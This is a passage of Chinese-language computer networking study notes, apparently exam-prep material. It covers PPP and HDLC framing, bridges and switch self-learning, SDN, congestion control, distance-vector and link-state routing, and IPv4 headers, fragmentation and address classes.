<li>PPP 提供差错检测但不提供纠错功能，只保证无差错接收（通过硬件进行 CRC 校验）。它是不可靠的传输协议，因此也不使用序号和确认机制</li>
<li>它仅支持点对点的链路通信，不支持多点线路</li>
<li>PPP 只支持全双工链路</li>
<li>PPP 的两端可以运行不同的网络层协议，但仍然可使用同个 PPP 进行通信</li>
<li>PPP 是面向字节的，当信息字段出现和标志字段一致的比特组合时，PPP 有两种不同的处理方法：若 PPP 用在异步线路（默认），则采用字符填充法；若 PPP 用在 SONET/SDH 等同步线路，则协议规定采用硬件来完成比特填充（和 HDLC 的做法一样）。</li>
</ul>
<h4> HDLC 协议</h4>
<p>高级数据链路控制（HDLC）协议是面向比特的数据链路层协议。该协议不依赖于任何一种字符编码集；数据报文可透明传输，用于实现透明传输的 “0 比特插入法” 易于硬件实现；全双工通信，有较高的数据链路传输效率；所有帧采用 CRC 检验，对信息帧进行顺序编号，可防止漏收或重发，传输可靠性高；传输控制功能与处理功能分离，具有较大的灵活性。</p>
<p>HDLC 的帧格式，它由标志、地址、控制、信息和 FCS 等字段构成。</p>
<ul>
<li>标志字段 F，为 <code>01111110</code>。在接收端只要找到标志字段就可确定一个帧的位置。HDLC 协议采用比特填充的首尾标志法实现透明传输。在发送端，当一串比特流数据中有 <code>5</code> 个连续的 <code>1</code> 时，就立即在其后填入一个 <code>0</code>。接收帧时，先找到 <code>F</code> 字段以确定帧的边界，接着对比特流进行扫描。每当发现 <code>5</code> 个连续的 <code>1</code> 时，就将其后的一个 <code>0</code> 删除，以还原成原来的比特流</li>
<li>地址字段 A，共 <code>8</code> 位，根据不同的传送方式，表示从站或应答站的地址</li>
<li>控制字段 C，共 <code>8</code> 位，HDLC 的许多重要功能都靠控制字段来实现</li>
</ul>
<p><strong>PPP 帧和 HDLC 帧格式的不同：</strong></p>
<ul>
<li>PPP 协议是面向字节的，HDLC 协议是面向比特的</li>
<li>PPP 帧比 HDLC 帧多一个 <code>2</code> 字节的协议字段。当协议字段值为 <code>0x0021</code> 时，表示信息字段是 IP 数据报</li>
<li>PPP 协议不使用序号和确认机制，只保证无差错接收（CRC 检验），而端到端差错检测由高层协议负责。HDLC 协议的信息帧使用了编号和确认机制，能够提供可靠传输</li>
</ul>
<h3> 数据链路层设备</h3>
<h4> 网桥的基本概念</h4>
<p>两个或多个以太网通过网桥连接后，就成为一个覆盖范围更大的以太网，而原来的每个以太网就称为一个网段。网桥工作在链路层的 MAC 子层，可以使以太网各网段成为隔离开的碰撞域（又称冲突域）。如果把网桥换成工作在物理层的转发器，那么就没有这种过滤通信量的功能。由于各网段相对独立，因此一个网段的故障不会影响到另一个网段的运行。网桥必须具有路径选择的功能，接收到帧后，要决定正确的路径，将该帧转送到相应的目的局域网站点。</p>
<p>网络 <code>1</code> 和网络 <code>2</code> 通过网桥连接后，网桥接收网络 <code>1</code> 发送的数据帧，检查数据帧中的地址，如果是网络 <code>2</code> 的地址，那么就转发给网络 <code>2</code>；如果是网络 <code>1</code> 的地址，那么就将其丢弃，因为源站和目的站处在同一个网段，目的站能够直接收到这个帧而不需要借助网桥转发。</p>
<h4> 局域网交换机</h4>
<ol>
<li>
<p><strong>交换机的原理和特点</strong></p>
<p>局域网交换机，又称以太网交换机，以太网交换机实质上就是一个多端口的网桥，它工作在数据链路层。以太网交换机的每个端口都直接与单台主机或另一个交换机相连，通带都工作在全双工方式。交换机能经济地将网络分成小的冲突域，为每个工作站提供更高的带宽。<strong>以太网交换机的原理是</strong>：它检测从以太端口来的数据帧的源和目的地的 MAC（介质访间层）地址，然后与系统内部的动态查找表进行比较，若数据帧的源 MAC 地址不在查找表中，则将该地址加入查找表，并将数据帧发送给相应的目的端口。以太网交换机对工作站是透明的，因此管理开销低廉，简化了网络结点的增加、移动和网络变化的操作。利用以太网交换机还可以方便地实现虚拟局域网 VL AN，VLAN 不仅可以隔离冲突域，而且可以隔离广播域。</p>
<p>对于传统 <code>10Mb/s</code> 的共享式以太网，若共有 <code>N</code> 个用户，则每个用户占有的平均带宽只有总带宽（10Mb/s）的 <code>1/N</code>。在使用以太网交换机（默认工作在全双工）来连接这些主机，虽然在每个端口到主机的带宽还是 <code>10Mb/s</code>，但由于一个用户在通信时是独占而不是和其他网络用户共享传输媒体的带宽，因此拥有 <code>N</code> 个端口的交换机的总容量为 <code>N x 10Mb/s</code>。这正是交换机的最大优点。</p>
<p><strong>以太网交换机的特点：</strong></p>
<ul>
<li>每个端口都直接与单台主机相连（网桥的端口往往连接到一个网段），并且一般都工作在全双工方式</li>
<li>能同时连通多对端口，使每对相互通信的主机都能像独占通信媒体那样，无碰撞地传输数据</li>
<li>是一种即插即用设备，其内部的帧的转发表是通过自学习算法自动地逐渐建立起来的</li>
<li>由于使用专用的交换结构芯片，交换速率较高</li>
<li>独占传输媒体的带宽</li>
</ul>
<p><strong>以太网交换机主要采用两种交换模式：</strong></p>
<ul>
<li><strong>直通式交换机</strong>：只检查帧的目的地址，这使得帧在接收后几乎能马上被传出去。这种方式速度快，但缺乏智能性和安全性，也无法支持具有不同速率的端口的交换</li>
<li><strong>存储转发式交换机</strong>：先将接收到的帧缓存到高速缓存器中，并检查数据是否正确，确认无误后通过查找表转换成输出端口将该帧发送出去。如果发现帧有错，那么就将其丢弃。优点是可靠性高，并能支持不同速率端口间的转换，缺点是延迟较大</li>
</ul>
<p>以太网交换机一般都具有多种速率的端口，例如：可以具有 <code>10Mb/s</code>、<code>100Mb/s</code> 和 <code>1Gb/s</code> 的端口的各种组合，因此大大方便了各种不同情况的用户。</p>
</li>
<li>
<p><strong>交换机的自学习功能</strong></p>
<p>决定一个帧是应该转发到某个端口还是应该将其丢弃称为 <strong>过滤</strong>。决定一个帧应该被移动到哪个接口称为 <strong>转发</strong>。交换机的过滤和转发借助于 <strong>交换表（switch table）</strong> 完成。交换表中的一个表项至少包含：一个 MAC 地址；连通该 MAC 地址的交换机端口。例如：以太网交换机有 <code>4</code> 个端口，各连接一台计算机，MAC 地址分别为 <code>A</code>、<code>B</code>、<code>C</code> 和 <code>D</code>，交换机的交换表初始是空的。</p>
<p><code>A</code> 先向 <code>B</code> 发送一帧，从端口 <code>1</code> 进入交换机。交换机收到帧后，查找交换表，找不到 MAC 地址为 <code>B</code> 的表项。然后，交换机将该帧的源地址 <code>A</code> 和端口 <code>1</code> 写入交换表，并向除端口 <code>1</code> 外的所有端口广播这个帧（该帧就是从端口 <code>1</code> 进入的，因此不应该将它再从端口 <code>1</code> 转发出去）。<code>C</code> 和 <code>D</code> 丢弃该帧，因为目的地址不对。只有 <code>B</code> 才收下这个目的地址正确的帧。交换表中写入（MAC 地址 A, 端口 1）后，以后从任何端口收到目的地址为 <code>A</code> 的帧，都应该从端口 <code>1</code> 转发出去。这是因为，既然 <code>A</code> 发出的帧从端口 <code>1</code> 进入交换机，那么从端口 <code>1</code> 转发出去的帧也应能到达 <code>A</code>。</p>
<p>接下来，假定 <code>B</code> 通过端口 <code>3</code> 向 <code>A</code> 发送一帧，交换机查找交换表后，发现有表项（MAC 地址 A, 端口 1），将该帧从端口 <code>1</code> 转发给 <code>A</code>。显然，此时已经没有必要再广播收到的帧。将该帧的源地址 <code>B</code> 和端口 <code>3</code> 写入交换表，表明以后如有发送给 <code>B</code> 的帧，应该从端口 <code>3</code> 转发出去。</p>
<p>经过一段时间，只要主机 <code>C</code> 和 <code>D</code> 也向其他主机发送帧，交换机就会把 <code>C</code> 和 <code>D</code> 及对应的端口号写入交换表。这样，转发给任何主机的帧，都能很快地在交换表中找到相应的转发端口。</p>
<p>考虑到交换机所连的主机会随时变化，这就需要更新交换表中的表项。为此，交换表中的每个表项都设有一定的有效时间，过期的表项会自动删除。这就保证了交换表中的数据符合当前网络的实际状况。这种自学习方法使得交换机能够即插即用，而不必人工进行配置，因此非常方便。</p>
</li>
</ol>
<h2> 网络层</h2>
<h3> 网络层的功能</h3>
<p>互联网在网络层的设计思路是，向上只提供简单灵活的、无连接的、尽最大努力交付的数据报服务。也就是说，所传送的分组可能出错、丢失、重复、失序或超时，这就使得网络中的路由器比较简单，而且价格低廉。如果主机中的进程之间的通信需要是可靠的，那么可以由更高层的传输层来负责。采用这种设计思路的好处是：网络的造价大大降低，运行方式灵活，能够适应多种应用。互联网能够发展到今日的规模，充分证明了当初采用这种设计思想的正确性。</p>
<h4> 异构网络互连</h4>
<p>要在全球范围内把数以百万计的网络互连起来，并且能够互相通信，是一项非常复杂的任务，此时需要解决许多问题，比如不同的寻址方案、不同的网络接入机制、不同的差错处理方法、不同的路由选择机制等等。用户的需求是多样的，没有一种单一的网络能够适应所有用户的需求。网络层所要完成的任务之一就是使这些异构的网络实现互连。</p>
<p>网络互连是指将两个以上的计算机网络，通过一定的方法，用一些中间设备（又称中继系统）相互连接起来，以构成更大的网络系统。根据所在的层次，<strong>中继系统分为以下四种：</strong></p>
<ul>
<li><strong>物理层中继系统</strong>：转发器，集线器</li>
<li><strong>数据链路层中继系统</strong>：网桥或交换机</li>
<li><strong>网络层中继系统</strong>：路由器</li>
<li><strong>网络层以上的中继系统</strong>：网关</li>
</ul>
<p>使用物理层或数据链路层的中继系统时，只是把一个网络扩大了，而从网络层的角度看，它仍然是同一个网络，一般并不称为网络互连。因此网络互连通常是指用路由器进行网络互连和路由选择。路由器是一台专用计算机，用于在互联网中进行路由选择。</p>
<div class="hint-container info">
<p class="hint-container-title">相关信息</p>
<p>由于历史原因，许多有关 TCP/IP 的文献也把网络层的路由器称为网关</p>
</div>
<p>TCP/IP 体系在网络互连上采用的做法是在网络层采用标准化协议，但相互连接的网络可以是异构的。用许多计算机网络通过一些路由器进行互连。由于参加互连的计算机网络都使用相同的 IP 协议，因此可以把互连后的网络视为一个虚拟 IP 网络。</p>
<p>虚拟互连网络也就是逻辑互连网络，其意思是互连起来的各种物理网络的异构性本来是客观存在的，但是通过 IP 协议就可以使这些性能各异的网络在网络层上看起来好像是一个统一的网络。这种使用 IP 协议的虚拟互连网络可简称为 IP 网络。</p>
<p>使用 IP 网络的好处是：当 IP 网上的主机进行通信时，就好像在一个单个网络上通信一样，而看不见互连的各网络的具体异构细节（如：具体的编址方案、路由选择协议等）</p>
<h4> 路由与转发</h4>
<p>路由器主要完成两个功能：一是 <strong>路由选择</strong>（确定哪一条路径），二是 <strong>分组转发</strong>（当一个分组到达时所采取的动作）。前者是根据特定的路由选择协议构造出路由表，同时经常或定期地和相邻路由器交换路由信息而不断地更新和维护路由表。后者处理通过路由器的数据流，关键操作是转发表查询、转发及相关的队列管理和任务调度等。</p>
<ul>
<li><strong>路由选择</strong>：指按照复杂的分布式算法，根据从各相邻路由器所得到的关于整个网络拓扑的变化情况，动态地改变所选择的路由</li>
<li><strong>分组转发</strong>：指路由器根据转发表将用户的IP数据报从合适的端口转发出去</li>
</ul>
<p>路由表是根据路由选择算法得出的，而转发表是从路由表得出的。转发表的结构应当使查找过程最优化，路由表则需要对网络拓扑变化的计算最优化。在讨论路由选择的原理时，往往不去区分转发表和路由表，而是笼统地使用路由表一词。</p>
<h4> SDN 的基本概念</h4>
<p>网络层的主要任务是转发和路由选择。可以将网络层抽象地划分为数据平面（也称转发层面）和控制平面，转发是数据平面实现的功能，而路由选择是控制平面实现的功能。</p>
<p><strong>软件定义网络（SDN）</strong> 是近年流行的一种创新网络架构，它采用集中式的控制平面和分布式的数据平面，两个平面相互分离，控制平面利用控制-数据接口对数据平面上的路由器进行集中式控制，方便软件来控制网络。在传统互联网中，每个路由器既有转发表又有路由选择软件，也就是说，既有数据平面又有控制平面。但是在 SDN 结构中，路由器都变得简单了，它的路由选择软件都不需要了，因此路由器之间不再相互交换路由信息。在网络的控制平面有一个逻辑上的远程控制器（可以由多个服务器组成）。远程控制器掌握各主机和整个网络的状态，为每个分组计算出最佳路由，通过 Openflow 协议（也可以通过其他途径）将转发表（在 SDN 中称为流表）下发给路由器。路由器的工作很单纯，即收到分组、查找转发表、转发分组。</p>
<p>这样，网络又变成集中控制的，本来互联网是分布式的。SDN 并非要把整个互联网都改造成集中控制模式，这是不现实的。然而，在某些具体条件下，特别是像一些大型的数据中心之间的广域网，使用 SDN 模式来建造，就可以使网络的运行效率更高。</p>
<p>SDN 的可编程性通过为开发者们提供强大的编程接口，使得网络具有很好的编程性。对上层应用的开发者，SDN 提供的编程接口称为 <strong>北向接口</strong>，北向接口提供了一系列丰富的 API，开发者可以在此基础上设计自已的应用，而不必关心底层的硬件细节。SDN 控制器和转发设备建立双向会话的接口称为 <strong>南向接口</strong>，通过不同的南向接口协议（如：Openflow），SDN 控制器就可兼容不同的硬件设备，同时可以在设备中实现上层应用的逻辑。SDN 控制器集群内部控制器之间的通信接口称为 <strong>东西向接口</strong>，用于增强整个控制平面的可靠性和可拓展性。</p>
<p><strong>SDN 的优点：</strong></p>
<ul>
<li>全局集中式控制和分布式高速转发，既利于控制平面的全局优化，又利于高性能的网络转发</li>
<li>灵活可编程与性能的平衡，控制和转发功能分离后，使得网络可以由专有的自动化工具以编程方式配置</li>
<li>降低成本，控制和数据平面分离后，尤其是在使用开放的接口协议后，就实现了网络设备的制造与功能软件的开发相分离，从而有效降低了成本</li>
</ul>
<p><strong>SDN 的问题：</strong></p>
<ul>
<li>安全风险，集中管理容易受攻击，如果崩溃，整个网络会受到影响</li>
<li>瓶颈问题，原本分布式的控制平面集中化后，随着网络规模扩大，控制器可能成为网络性能的瓶颈</li>
</ul>
<h4> 拥塞控制</h4>
<p>在通信子网中，<strong>因出现过量的分组而引起网络性能下降的现象称为拥塞</strong>。例如：某个路由器所在链路的带宽为 <code>RB/s</code>，如果 IP 分组只从它的某个端口进入，那么其速率为 r<sub>in</sub>B/s。当 r<sub>in</sub> = R 时，可能看起来是件 “好事”，因为链路带宽被充分利用。但是，当分组到达路由器的速率接近 <code>R</code> 时，平均时延急剧增加，并且会有大量的分组被丢弃（路由器端口的缓冲区是有限的），整个网络的吞吐量会骤降，源与目的地之间的平均时延也会变得近乎无穷大。</p>
<p>判断网络是否进入拥塞状态的方法是，观察网络的吞吐量与网络负载的关系：如果随着网络负载的增加，网络的吞吐量明显小于正常的吞吐量，那么网络就可能已进入 “轻度拥塞” 状态；如果网络的吞吐量随着网络负载的增大而下降，那么网络就可能已进入拥塞状态；如果网络的负载继续增大，而网络的吞吐量下降到零，那么网络就可能已进入死锁状态。</p>
<p>为避免拥塞现象的出现，要采用能防止拥塞的一系列方法对子网进行拥塞控制。<strong>拥塞控制</strong> 主要解决的问题是如何获取网络中发生拥塞的信息，从而利用这些信息进行控制，以避免由于拥塞而出现分组的丢失，以及严重拥塞而产生网络死锁的现象。</p>
<p>拥塞控制的作用是确保子网能够承载所达到的流量，这是一个全局性的过程，涉及各方面的行为：主机、路由器及路由器内部的转发处理过程等。单一地增加资源并不能解决拥塞。</p>
<p><strong>流量控制和拥塞控制的区别</strong>：流量控制往往是指在发送端和接收端之间的点对点通信量的控制。流量控制所要做的是抑制发送端发送数据的速率，以便使接收端来得及接收。而拥塞控制必须确保通信子网能够传送待传送的数据，是一个全局性的问题，涉及网络中所有的主机、路由器及导致网络传输能力下降的所有因素。</p>
<p><strong>拥塞控制的方法有两种：</strong></p>
<ul>
<li><strong>开环控制</strong>：在设计网络时事先将有关发生拥塞的因素考虑周到，力求网络在工作时不产生拥塞。这是一种静态的预防方法。一旦整个系统启动并运行，中途就不再需要修改。开环控制手段包括确定何时可接收新流量、何时可丢弃分组及丢弃哪些分组，确定何种调度策略等。所有这些手段的共性是，在做决定时不考虑当前网络的状态</li>
<li><strong>闭环控制</strong>：事先不考虑有关发生拥塞的各种因素，采用监测网络系统去监视，及时检测哪里发生了拥塞，然后将拥塞信息传到合适的地方，以便调整网络系统的运行，并解决出现的问题。闭环控制是基于反馈环路的概念，是一种动态的方法</li>
</ul>
<h3> 路由算法</h3>
<h4> 静态路由与动态路由</h4>
<p>路由器转发分组是通过路由表转发的，而路由表是通过各种算法得到的。从能否随网络的通信量或拓扑自适应地进行调整变化来划分，<strong>路由算法可以分为如下两大类：</strong></p>
<p><strong>静态路由算法（又称非自适应路由算法）</strong>：指由网络管理员手工配置的路由信息。当网络的拓扑结构或链路的状态发生变化时，网络管理员需要手工去修改路由表中相关的静态路由信息。它不能及时适应网络状态的变化，对于简单的小型网络，可以采用静态路由
<strong>动态路由算法（又称自适应路由算法）</strong>：指路由器上的路由表项是通过相互连接的路由器之间彼此交换信息，然后按照一定的算法优化出来的，而这些路由信息会在一定时间间隙里不断更新，以适应不断变化的网络，随时获得最优的寻路效果。</p>
<p><strong>静态路由算法的特点是</strong>：简便和开销较小，在拓扑变化不大的小网络中运行效果很好。动态路由算法能改善网络的性能并有助于流量控制；但算法复杂，会增加网络的负担，有时因对动态变化的反应太快而引起振荡，或反应太慢而影响网络路由的一致性，因此要仔细设计动态路由算法，以发挥其优势。<strong>常用的动态路由算法可分为两类</strong>：距离-向量路由算法和链路状态路由算法。</p>
<h4> 距离-向量路由算法</h4>
<p>在距离-向量路由算法中，所有结点都定期地将它们的整个路由选择表传送给所有与之直接相邻的结点。<strong>这种路由选择表包含：</strong></p>
<ul>
<li>每条路径的目的地（另一结点）</li>
<li>路径的代价（也称距离）</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>这里的距离是一个抽象的概念，如：RIP 就将距离定义为 “跳数”。跳数指从源端口到达目的端口所经过的路由器个数，每经过一个路由器，跳数加 <code>1</code></p>
</div>
<p>在这种算法中，所有结点都必须参与距离向量交换，以保证路由的有效性和一致性，也就是说，所有的结点都监听从其他结点传来的路由选择更新信息，并在下列情况下更新它们的路由选择表:</p>
<ul>
<li>被通告一条新的路由，该路由在本结点的路由表中不存在，此时本地系统加入这条新的路由</li>
<li>发来的路由信息中有一条到达某个目的地的路由，该路由与当前使用的路由相比，有较短的距离（较小的代价）。此种情况下，就用经过发送路由信息的结点的新路由替换路由表中到达那个目的地的现有路由</li>
</ul>
<p>距离-向量路由算法的实质是，迭代计算一条路由中的站段数或延迟时间，从而得到到达一个目标的最短（最小代价）通路。它要求每个结点在每次更新时都将它的全部路由表发送给所有相邻的结点。显然，更新报文的大小与通信子网的结点个数成正比，大的通信子网将导致很大的更新报文。由于更新报文发给直接邻接的结点，所以所有结点都将参加路由选择信息交换。基于这些原因，在通信子网上传送的路由选择信息的数量很容易变得非常大。</p>
<p>最常见的距离-向量路由算法是 RIP 算法，它采用 “跳数” 作为距离的度量。</p>
<h4> 链路状态路由算法</h4>
<p>链路状态路由算法要求每个参与该算法的结点都具有完全的网络拓扑信息，它们执行下述两项任务。第一，主动测试所有邻接结点的状态。两个共享一条链接的结点是相邻结点，它们连接到同一条链路，或者连接到同一广播型物理网络。第二，定期地将链路状态传播给所有其他结点（或称路由结点）。<strong>典型的链路状态算法是 OSPF 算法。</strong></p>
<p>在一个链路状态路由选择中，一个结点检查所有直接链路的状态，并将所得的状态信息发送给网上的所有其他结点，而不是仅送给那些直接相连的结点。每个结点都用这种方式从网上所有其他的结点接收包含直接链路状态的路由选择信息。</p>
<p>每当链路状态报文到达时，路由结点便使用这些状态信息去更新自己的网络拓扑和状态 “视野图”，一旦链路状态发生变化，结点就对更新的网络图利用 Dijkstra 最短路径算法重新计算路由，从单一的源出发计算到达所有目的结点的最短路径。</p>
<p><strong>链路状态路由算法主要有三个特征：</strong></p>
<ul>
<li>向本自治系统中所有路由器发送信息，这里使用的方法是洪泛法，即路由器通过所有端口向所有相邻的路由器发送信息。而每个相邻路由器又将此信息发往其所有相邻路由器（但不再发送给刚刚发来信息的那个路由器）</li>
<li>发送的信息是与路由器相邻的所有路由器的链路状态，但这只是路由器所知道的部分信息。所谓 “链路状态”，是指说明本路由器与哪些路由器相邻及该链路的 “度量”。对于 OSPF 算法，链路状态的 “度量” 主要用来表示费用、距离、时延、带宽等</li>
<li>只有当链路状态发生变化时，路由器才向所有路由器发送此信息</li>
</ul>
<p>由于一个路由器的链路状态只涉及相邻路由器的连通状态，而与整个互联网的规模并无直接关系，因此链路状态路由算法可以用于大型的或路由信息变化聚敛的互联网环境。</p>
<p><strong>链路状态路由算法的主要优点是</strong>：每个路由结点都使用同样的原始状态数据独立地计算路径，而不依赖中间结点的计算；链路状态报文不加改变地传播，因此采用该算法易于查找故障。当一个结点从所有其他结点接收到报文时，它可以在本地立即计算正确的通路，保证一步汇聚。最后，由于链路状态报文仅运载来自单个结点关于直接链路的信息，其大小与网络中的路由结点数目无关，因此链路状态算法比距离一向量算法有更好的规模可伸展性。</p>
<p><strong>距离-向量路由算法与链路状态路由算法的比较</strong>：在距离-向量路由算法中，每个结点仅与它的直接邻居交谈，它为它的邻居提供从自己到网络中所有其他结点的最低费用估计。在链路状态路由算法中，每个结点通过广播的方式与所有其他结点交谈，但它仅告诉它们与它直接相连的链路的费用。相较之下，距离-向量路由算法有可能遇到路由环路等问题。</p>
<h4> 层次路由</h4>
<p>当网络规模扩大时，路由器的路由表成比例地增大。这不仅会消耗越来越多的路由器缓冲区空间，而且需要用更多 CPU 时间来扫描路由表，用更多的带宽来交换路由状态信息。因此路由选择必须按照层次的方式进行。</p>
<p>因特网将整个互联网划分为许多较小的自治系统（注意一个自治系统中包含很多局域网），每个自治系统有权自主地决定本系统内应采用何种路由选择协议。如果两个自治系统需要通信，那么就需要一种在两个自治系统之间的协议来屏蔽这些差异。据此，<strong>因特网把路由选择协议划分为两大类：</strong></p>
<ul>
<li>一个自治系统内部所使用的路由选择协议称为内部网关协议（IGP），也称域内路由选择，具体的协议有 RIP 和 OSPF 等</li>
<li>自治系统之间所使用的路由选择协议称为外部网关协议（EGP），也称域间路由选择，用在不同自治系统的路由器之间交换路由信息，并负责为分组在不同自治系统之间选择最优的路径。具体的协议有 BGP</li>
</ul>
<p>使用层次路由时，OSPF 将一个自治系统再划分为若干区域（Area），每个路由器都知道在本区域内如何把分组路由到目的地的细节，但不用知道其他区域的内部结构。</p>
<p>采用分层次划分区域的方法虽然会使交换信息的种类增多，也会使 OSPF 协议更加复杂。但这样做却能使每个区域内部交换路由信息的通信量大大减小，因而使 OSPF 协议能够用于规模很大的自治系统中。</p>
<h3> IPv4</h3>
<h4> IPv4 分组</h4>
<p>IPv4 即现在普遍使用的 IP 协议（版本 4）。IP 协议定义数据传送的基本单元——IP 分组及其确切的数据格式。IP 协议也包括一套规则，指明分组如何处理、错误怎样控制。特别是 IP 协议还包含非可靠投递的思想，以及与此关联的分组路由选择的思想。</p>
<ol>
<li>
<p><strong>IPv4 分组的格式</strong></p>
<p>一个 IP 分组由首部和数据部分组成。首部前一部分的长度固定，共 <code>20B</code>，是所有 IP 分组必须具有的。在首部固定部分的后面是一些可选字段，其长度可变，用来提供错误检测及安全等机制。IP 数据报的格式如下图所示：</p>
<figure><figcaption>IP 数据报的格式</figcaption></figure>
<p><strong>IP 首部的部分重要字段含义如下：</strong></p>
<ul>
<li><strong>版本</strong>：指 IP 协议的版本，目前广泛使用的版本号为 <code>4</code></li>
<li><strong>首部长度</strong>：占 <code>4</code> 位，可以表示的最大十进制数是 <code>15</code>。以 <code>32</code> 位为单位，最大值为 <code>60B</code>（15 × 4B）。最常用的首部长度是 <code>20B</code>，此时不使用任何选项（即可选字段）</li>
<li><strong>总长度</strong>：占 <code>16</code> 位。指首部和数据之和的长度，单位为字节，因此数据报的最大长度为 2<sup>16</sup> - 1 = 65535B。以太网帧的最大传送单元（MTU）为 <code>1500B</code>，因此当一个 IP 数据报封装成帧时，数据报的总长度（首部加数据）一定不能超过下面的数据链路层的 MTU 值</li>
<li><strong>标识</strong>：占 <code>16</code> 位。它是一个计数器，每产生一个数据报就加 <code>1</code>，并赋值给标识字段。但它并不是 “序号”（因为 IP 是无连接服务）。当一个数据报的长度超过网络的 MTU 时，必须分片，此时每个数据报片都复制一次标识号，以便能正确重装成原来的数据报</li>
<li><strong>标志</strong>：占 <code>3</code> 位。标志字段的最低位为 MF，<code>MF = 1</code> 表示后面还有分片，<code>MF = 0</code> 表示最后一个分片。标志字段中间的一位是 <code>DF</code>，只有当 <code>DF = 0</code> 时才允许分片</li>
<li><strong>片偏移</strong>：占 <code>13</code> 位。它指出较长的分组在分片后，某片在原分组中的相对位置。片偏移以 <code>8</code> 个字节为偏移单位。除最后一个分片外，每个分片的长度一定是 <code>8B</code> 的整数倍</li>
<li><strong>生存时间（TTL）</strong>：占 <code>8</code> 位。数据报在网络中可通过的路由器数的最大值，标识分组在网络中的寿命，以确保分组不会永远在网络中循环。路由器在转发分组前，先把 TTL 减 <code>1</code>。若 TTL 被减为 <code>0</code>，则该分组必须丢弃</li>
<li><strong>协议</strong>：占 <code>8</code> 位。指出此分组携带的数据使用何种协议，即分组的数据部分应上交给哪个协议进行处理，如：TCP、UDP 等。其中值为 <code>6</code> 表示 TCP，值为 <code>17</code> 表示 UDP</li>
<li><strong>首部校验和</strong>：占 <code>16</code> 位。首部校验和只校验分组的首部，而不校验数据部分</li>
<li><strong>源地址字段</strong>：占 <code>4B</code>，标识发送方的 IP 地址</li>
<li><strong>目的地址字段</strong>：占 <code>4B</code>，标识接收方的 IP 地址</li>
</ul>
</li>
<li>
<p><strong>IP 数据报分片</strong></p>
<p>一个链路层数据报能承载的最大数据量称为 <strong>最大传送单元（MTU）</strong>。因为 IP 数据报被封装在链路层数据报中，因此链路层的 MTU 严格地限制着 IP 数据报的长度，而且在 IP 数据报的源与目的地路径上的各段链路可能使用不同的链路层协议，有不同的 MTU。例如：以太网的 MTU 为 <code>1500B</code>，而许多广域网的 MTU 不超过 <code>576B</code>。当 IP 数据报的总长度大于链路 MTU 时，就需要将 IP 数据报中的数据分装在多个较小的 IP 数据报中，这些较小的数据报称为 <strong>片。</strong></p>
<p>片在目的地的网络层被重新组装。目的主机使用 IP 首部中的标识、标志和片偏移字段来完成对片的重组。创建一个 IP 数据报时，源主机为该数据报加上一个标识号。当一个路由器需要将一个数据报分片时，形成的每个数据报（即片）都具有原始数据报的标识号。当目的主机收到来自同一发送主机的一批数据报时，它可以通过检查数据报的标识号来确定哪些数据报属于同一个原始数据报的片。IP 首部中的标志位占 <code>3</code> 位，但只有后 <code>2</code> 位有意义，分别是 <code>MF</code> 位（More Fragment）和 <code>DF</code> 位（Don't Fragment）。只有当 <code>DF = 0</code> 时，该 IP 数据报才可以被分片。<code>MF</code> 则用来告知目的主机该 IP 数据报是否为原始数据报的最后一个片。当 <code>MF = 1</code> 时，表示相应的原始数据报还有后续的片；当 <code>MF = 0</code> 时，表示该数据报是相应原始数据报的最后一个片。目的主机在对片进行重组时，使用片偏移字段来确定片应放在原始 IP 数据报的哪个位置。</p>
<p>IP 分片涉及一定的计算。例如：一个长 <code>4000B</code> 的 IP 数据报（首部 <code>20B</code>，数据部分 <code>3980B</code>）到达一个路由器，需要转发到一条 MTU 为 <code>1500B</code> 的链路上。这意味着原始数据报中的 <code>3980B</code> 数据必须被分配到 <code>3</code> 个独立的片中（每片也是一个 IP 数据报）。假定原始数据报的标识号为 <code>777</code>，那么分成的 <code>3</code> 片如下图所示。由于偏移值的单位是 <code>8B</code>，所以除最后一个片外，其他所有片中的有效数据载荷都是 <code>8</code> 的倍数。</p>
<figure><figcaption>IP 分片</figcaption></figure>
</li>
</ol>
<h4> IPv4 地址与 NAT</h4>
<ol>
<li>
<p><strong>IPv4 地址</strong></p>
<p>连接到因特网上的每台主机（或路由器）都分配一个 <code>32</code> 比特的全球唯一标识符，即 IP 地址。IP 地址由互联网名字和数字地址分配机构 ICANN 进行分配。</p>
<p>互联网早期采用的是分类的 IP 地址，如下图所示：</p>
<figure><figcaption>IP 地址</figcaption></figure>
<p><strong>无论哪类 IP 地址，都由网络号和主机号两部分组成</strong>。即 IP 地址: = {&lt;网络号&gt;,&lt;主机号&gt;}。其中网络号标志主机（或路由器）所连接到的网络。一个网络号在整个因特网范围内必须是唯一的。主机号标志该主机（或路由器）。一台主机号在它前面的网络号所指明的网络范围内必须是唯一的。由此可见，一个 IP 地址在整个因特网范围内是唯一的。</p>
<p>在各类 IP 地址中，有些 IP 地址具有特殊用途，不用做主机的 IP 地址：</p>
<ul>
<li>主机号全为 <code>0</code> 表示本网络本身，如：<code>202.98.174.0</code></li>
<li>主机号全为 <code>1</code> 表示本网络的广播地址，又称直接广播地址，如：<code>202.98.174.255</code></li>
<li><code>127.x,×,x</code> 保留为环回自检（Loop back Test）地址，此地址表示任意主机本身，目的地址为环回地址的 IP 数据报永远不会出现在任何网络上</li>
<li><code>32</code> 位全为 <code>0</code>，即 <code>0.0.0.0</code> 表示本网络上的本主机</li>
<li><code>32</code> 位全为 <code>1</code>，即 <code>255.255.255.255</code> 表示整个 TCP/IP 网络的广播地址，又称受限广播地址</li>
</ul>
<p>实际使用时，由于路由器对广播域的隔离，<code>255.255.255.255</code> 等效为本网络的广播地址。<strong>常用的三种类别 IP 地址的使用范围见下表：</strong></p>
<table>
<thead>
<tr>
<th style="text-align:center">网络类别</th>
<th style="text-align:center">最大可用网络数</th>
<th style="text-align:center">第一个可用的网络号</th>
<th style="text-align:center">最后一个可用的网络号</th>
<th style="text-align:center">每个网络中的最大主机数</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">A</td>
<td style="text-align:center">2<sup>7</sup> - 2</td>
<td style="text-align:center">1</td>
<td style="text-align:center">126</td>
<td style="text-align:center">2<sup>24</sup> -2</td>
</tr>
<tr>
<td style="text-align:center">B</td>
<td style="text-align:center">2<sup>14</sup></td>
<td style="text-align:center">128.0</td>
<td style="text-align:center">191.255</td>
<td style="text-align:center">2<sup>16</sup> - 2</td>
</tr>
<tr>
<td style="text-align:center">C</td>
<td style="text-align:center">2<sup>21</sup></td>
<td style="text-align:center">192.0.0</td>
<td style="text-align:center">223.255.255</td>
<td style="text-align:center">2<sup>8</sup> - 2</td>
</tr>
</tbody>
</table>
